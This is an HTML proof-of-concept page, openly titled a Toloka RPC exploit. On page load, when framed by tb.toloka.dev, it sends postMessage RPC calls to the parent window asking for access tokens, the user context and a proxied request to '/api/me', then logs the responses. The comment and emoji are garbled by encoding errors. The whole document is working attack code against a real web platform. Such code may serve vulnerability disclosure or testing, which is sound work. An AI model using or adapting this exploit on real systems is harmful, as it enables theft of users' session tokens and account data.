<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>PoC - Toloka RPC Exploit</title>
  <style>
    body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
    pre { white-space: pre-wrap; word-break: break-word; }
  </style>
</head>
<body>
  <h2>‚úÖ Toloka RPC PoC</h2>
  <pre id="log">[‚è≥] Waiting for RPC responses...</pre>

  <script>
    const logEl = document.getElementById('log');
    const log = (...args) => {
      const text = args.map(a => typeof a === 'object' ? JSON.stringify(a, null, 2) : a).join(' ');
      logEl.textContent += '\n' + text;
      console.log(...args);
    };

    function callRPC(name, payload = {}) {
      const id = crypto.randomUUID();
      window.addEventListener('message', function handler(e) {
        if (e.origin !== 'https://tb.toloka.dev') return;
        if (e.data?.type === 'rpc' && e.data.id === id) {
          log(`[‚úÖ ${name} Response from parent]`, e.data.payload);
          window.removeEventListener('message', handler);
        }
      });
      const msg = { type: 'rpc', id, name, payload };
      window.parent.postMessage(msg, '*');
      log(`[üì§] Sent "${name}" with id ${id}`, msg);
    }

    // ÿπŸÜÿØ ÿ™ÿ≠ŸÖŸäŸÑ ÿßŸÑÿµŸÅÿ≠ÿ©ÿå ŸÜŸÅÿ∞ RPC
    window.onload = () => {
      callRPC('getAccessToken');
      callRPC('getToken');
      callRPC('getContext');
      callRPC('fetch', {
        url: '/api/me',
        requestInit: { method: 'GET' }
      });
    };
  </script>
</body>
</html>
